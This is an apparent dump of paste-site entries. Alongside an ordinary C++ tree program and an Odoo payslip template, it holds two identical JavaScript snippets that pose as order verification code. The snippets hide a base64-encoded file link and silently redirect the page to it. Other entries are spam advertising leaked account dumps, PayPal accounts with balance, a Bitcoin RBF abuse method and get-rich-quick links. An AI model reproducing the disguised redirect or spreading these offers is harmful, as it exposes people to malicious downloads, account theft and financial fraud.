id,title,username,language,date,content
NYXxgX8C,Untitled,WassupDog45,JavaScript,Monday 5th of May 2025 07:08:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54626/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZBHGDZuq,k-left-tree,egogoboy,C++,Monday 5th of May 2025 07:03:47 AM CDT,"#include <iostream>                                                                                                                                                                                         
#include <iomanip>                                                                                                                                                                                          
#include ""Node.h""                                                                                                                                                                                           
                                                                                                                                                                                                            
int getMin(Node* node);                                                                                                                                                                                     
bool isLeaf(Node* node);                                                                                                                                                                                    
                                                                                                                                                                                                            
Node* makeTree(int k, int h, int& count) {                                                                                                                                                                  
    if (h == 1 || (h > 1 && k == 0)) {                                                                                                                                                                      
        ++count;                                                                                                                                                                                            
        return new Node();                                                                                                                                                                                  
    }                                                                                                                                                                                                       
                                                                                                                                                                                                            
    return new Node(makeTree(k - 1, h - 1, count), makeTree(k, h - 1, count));                                                                                                                              
}                                                                                                                                                                                                           
                                                                                                                                                                                                            
Node* growTree(Node* node, int k, int max_k, int& count, int max_n) {                                                                                                                                       
    if (k == max_k || count == max_n) {                                                                                                                                                                     
        return node;
}                                                                                                                                                                                                       
    if (isLeaf(node)) {                                                                                                                                                                                     
        node->left = new Node();                                                                                                                                                                            
        node->right = new Node();                                                                                                                                                                           
        count++;                                                                                                                                                                                            
        return node;                                                                                                                                                                                        
    }                                                                                                                                                                                                       
                                                                                                                                                                                                            
    node->left = growTree(node->left, k + 1, max_k, count, max_n);                                                                                                                                          
    node->right = growTree(node->right, k, max_k, count, max_n);                                                                                                                                            
                                                                                                                                                                                                            
    return node;                                                                                                                                                                                            
}                                                                                                                                                                                                           
                                                                                                                                                                                                            
Node* fillTree(Node* node, int& depth) {                                                                                                                                                                    
    if (node == nullptr) {                                                                                                                                                                                  
        return nullptr;                                                                                                                                                                                     
    }                                                                                                                                                                                                       

    node->left = fillTree(node->left, depth);
    node->right = fillTree(node->right, depth);
    if (isLeaf(node)) {
        node->key = depth++;
    } else {
        node->key = getMin(node->right);
    }

    return node;
}
void printTree(Node* node, int width) {
    if (node == nullptr) {
        return;
    }
    printTree(node->right, width + 5);
    std::cout << std::string(width, ' ') << node->key << std::endl;
    printTree(node->left, width + 5);
}

int main() {
    int k, n;
    std::cin >> k >> n;
    
    int h = 1;
    int count = 0;
    Node* head = makeTree(k, h, count);
    while (count != n + 1) {
        head = growTree(head, 0, k, count, n + 1);
    }

    int depth = 0;
    head = fillTree(head, depth);

    printTree(head, 0);


    return 0;
}

bool isLeaf(Node* node) {
    return node->left == nullptr && node->right == nullptr;
}

int getMin(Node* node) {
    if (node == nullptr) {
        return 0;
    }

    if (node->left == nullptr) {
        return node->key;
    }

    return getMin(node->left);
}"
1xgXB7PC,[4761113]adapt_payslip,rht_odoo,XML,Monday 5th of May 2025 07:03:17 AM CDT,"<data><xpath expr=""/t[@t-name='hr_payroll.report_payslip']"" position=""replace"" mode=""inner""><t t-call=""web.external_layout"">
            <div class=""page"">
                <h2 id=""payslip_name"">
                    <span t-field=""o.name"">August 2023 Payslip</span>
                </h2>
                <t t-set=""is_invalid"" t-value=""o._is_invalid()""/>
                <div t-if=""is_invalid"">
                    <strong id=""invalid_warning"">
                        <span t-out=""is_invalid"">This payslip is not validated. This is not a legal document.</span>
                    </strong>
                </div>
                <div t-else="""">
                    <div class=""oe_structure""/></div>
                <table name=""employee-infos"" id=""employee_info_table_1"" class=""table table-sm table-bordered o_selected_table"">
                    <tbody>
                        <tr id=""employee_info_line_1"" class=""o_small_ten-fs"">
                            <td class=""w-25"">
                                <strong>Employee</strong>
                            </td>
                            <td class=""w-25"">
                                <strong>Marital Status</strong>
                            </td>
                            <td class=""w-25"">
                                <strong>Designation</strong>
                            </td>
                            <td class=""w-25"">
                                <strong>Pay Period</strong>
                            </td>
                        </tr>
                        <tr id=""employee_info_line_2"" class=""o_small_ten-fs"">
                            <td class=""o_selected_td"">
                                <span t-field=""o.employee_id""/>

                            </td>
                            <td>
                                <span t-field=""o.employee_id.marital""/>
                            </td>
                            <td>
                                <span t-field=""o.employee_id.job_title""/>
                            </td>
                            <td>
                                <span t-if=""o.date_from &lt; o.contract_id.date_start"" t-field=""o.contract_id.date_start"">Start Date</span>
                                <span t-else="""" t-field=""o.date_from"">From</span>
                                <span t-if=""o.contract_id.date_end and o.date_to &gt; o.contract_id.date_end"" t-field=""o.contract_id.date_end"">End Date</span>
                                <span t-else="""" t-field=""o.date_to"">To</span>
                            </td>
                        </tr>
                        <tr id=""employee_info_line_4"" class=""o_small_ten-fs"">
                            <td>
                                <br/>
                            </td>
                            <td>
                                <strong>Person in charge</strong>
                            </td>
                            <td>
                                <strong>Identification</strong>
                            </td>
                            <td>
                                <strong>Computed on </strong>
                            </td>
                        </tr>
                        <tr id=""employee_info_line_5"" class=""o_small_ten-fs"">
                            <td>
                                <span t-field=""o.employee_id.work_email""/>
                            </td>
                            <td name=""personne-in-charge"">
                                <span t-out=""o.employee_id.children""/>
                            </td>
                            <td name=""identification-id"">
                                <span t-field=""o.employee_id.identification_id""/>
                            </td>
                            <td>
                                <span t-field=""o.compute_date""/>
                            </td>
                        </tr>
                        <tr id=""employee_info_line_6"" class=""o_small_ten-fs"">
                            <td class=""w-25"">
                                <strong>Contract Start Date</strong>
                            </td>
                            <td class=""w-25"">
                                <strong>Contract Type</strong>
                            </td>
                            <td class=""w-25"">
                                <strong>Working Schedule</strong>
                            </td>
                            <td class=""w-25"" name=""company-car-title""/>
                        </tr>
                        <tr id=""employee_info_line_7"" class=""o_small_ten-fs"">
                            <td>
                                <span t-field=""o.employee_id.first_contract_date""/>
                            </td>
                            <td>
                                <span t-field=""o.employee_id.contract_id.contract_type_id""/>
                            </td>
                            <td>
                                <span t-field=""o.employee_id.contract_id.hours_per_week""/>
                            </td>
                            <td class=""w-25"" name=""company-car-model""/>
                        </tr>
                    </tbody>
                </table>
               
                <div id=""total"" class=""o_small_ten-fs"">
                    <table class=""table table-sm"">
                        <thead class=""o_black_border"">
                            <tr>
                                <th id=""line_header_name"">Name</th>
                                <th id=""line_header_days"">Nombre</th>
                                <th id=""line_header_base""> Base</th>
                                <th id=""line_header_rate""> Taux (%)</th>
                                <th id=""line_header_amount"" class=""text-end"">Total</th>
                            </tr>
                        </thead>
                        <tbody>
                            <t id=""payslip_lines"">
                                <span t-foreach=""o.line_ids.filtered(lambda line: line.appears_on_payslip)"" t-as=""line"">
                                    <t t-set=""line_styling"" t-value=""line.get_payslip_styling_dict()""/>
                                    <t t-set=""line_style""/>
                                    <t t-set=""line_class""/>
                                    <t t-if=""line.code in line_styling"">
                                        <t t-set=""line_style"" t-value=""line_styling[line.code]['line_style']""/>
                                        <t t-set=""line_class"" t-value=""line_styling[line.code]['line_class']""/></t>
                                    <tr t-att-class=""line_class"" t-att-style=""line_style"" id=""line_display"">
                                        <td id=""payslip_line_name"">
                                            <span t-field=""line.name""/>
                                        </td>
                                        <td id=""payslip_line_quantity"">
                                            <span t-if=""line.quantity &gt; 1"" t-esc=""line.quantity""/>
                                        </td>
                                        <td id=""line_base"">
                                            <span t-field=""line.amount""/>
                                        </td>
                                        <td id=""line_rate"">
                                            <span t-if=""line.rate != 100"" t-field=""line.rate"" t-options=""{'precision': 2}""/>
                                            <span t-if=""line.rate != 100""> %</span>
                                        </td>
                                        <td id=""payslip_line_total"" class=""text-end"">
                                            <span t-esc=""line.total"" t-options=""{&quot;widget&quot;: &quot;monetary&quot;, &quot;display_currency&quot;: o.company_id.currency_id}"" t-att-style=""'color:#875A7B;' if line.total &lt; 0 else ''""/>
                                        </td>
                                    </tr>
                                </span>
                            </t>
                        </tbody>
                    </table>
                    <div class=""oe_structure""/></div>
                <div id=""to_pay"">
                    <p t-if=""o.net_wage &gt;= 0"">To pay on 
                        <b>
                            <span t-field=""o.employee_id.bank_account_id"">xxxxxxxxxxxx</span>
                        </b> of 
                        <i>
                            <span t-field=""o.employee_id""/>
                        </i>: 
                        <span t-field=""o.net_wage""/>
                    </p>
                    <p t-if=""o.net_wage &lt; 0"">The net amount will be recovered from the first positive remuneration established after this.</p>
                </div>
            </div></t>
    </xpath></data>"
NFaa0C53,Make $1000 15-MINUTES  (BEGINNER) YR,Ezyw,JavaScript,Monday 5th of May 2025 07:00:28 AM CDT," 
Pdf https://tinyurl.com/freshleaks

RDvCGndiJL
"
AqGPMnU9,PayPal with Balance,navrajkhunger,JavaScript,Monday 5th of May 2025 06:53:33 AM CDT,94278 Accounts Posted On https://t.me/leakzbyeminem
29ABUsiX,Abuse RBF in BTC transactions,luqlegal,JavaScript,Monday 5th of May 2025 06:53:16 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 58568
N2BQwduM,Products.js,WassupDog45,JavaScript,Monday 5th of May 2025 06:53:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46501/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
myhpubcB,EARN $900 INSTANTLY 2025 95,Ezyw,JavaScript,Monday 5th of May 2025 06:51:12 AM CDT," 
Pdf https://tinyurl.com/freshleaks

aEQ0sBCJKR
"
SUEqgQCk,Make $1000 15-MINUTES (BEGINNER) L4,Ezyw,JavaScript,Monday 5th of May 2025 06:41:57 AM CDT," 
Pdf https://tinyurl.com/freshleaks

qknlsBHnrK
"
vucfd3Wf,Leaked Accounts - Fresh Hits,navrajkhunger,JavaScript,Monday 5th of May 2025 06:38:11 AM CDT,82406 Accounts Posted On https://t.me/leakzbyeminem
